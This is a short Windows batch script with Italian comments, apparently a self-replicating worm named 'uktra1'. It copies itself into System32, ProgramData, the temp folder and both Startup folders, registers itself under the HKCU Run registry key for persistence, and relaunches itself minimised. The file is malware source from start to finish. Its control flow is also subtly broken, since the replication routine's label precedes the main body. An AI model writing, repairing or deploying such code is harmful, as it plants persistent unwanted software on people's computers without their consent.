@echo off

:: Imposta variabili
set "src=%~f0"
set "dst1=C:\ProgramData\uktra1_Worm"
set "dst2=C:\Windows\System32\uktra1.bat"
set "dst3=%TEMP%\uktra1.bat"
set "startup1=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uktra1.bat"
set "startup2=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\uktra1.bat"

:: Funzione per copiare il file in una destinazione specifica e ricrearlo se manca
:replicate
set "target=%1"
if not exist "%target%" (
    copy "%src%" "%target%" >nul
) else (
    fc /b "%src%" "%target%" >nul || copy "%src%" "%target%" >nul
)
goto :eof

:: Crea directory e copia il file batch in più posizioni
if not exist "%dst1%" mkdir "%dst1%"
call :replicate "%dst1%\uktra1.bat"
call :replicate "%dst2%"
call :replicate "%dst3%"

:: Copia se stesso nelle cartelle di avvio automatico
call :replicate "%startup1%"
call :replicate "%startup2%"

:: Imposta l'avvio automatico tramite il registro di sistema
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Uktra1" /t REG_SZ /d "%dst1%\uktra1.bat" /f >nul

:: Esegue il file batch copiato nella directory specificata
start /min "" "%dst1%\uktra1.bat"

exit
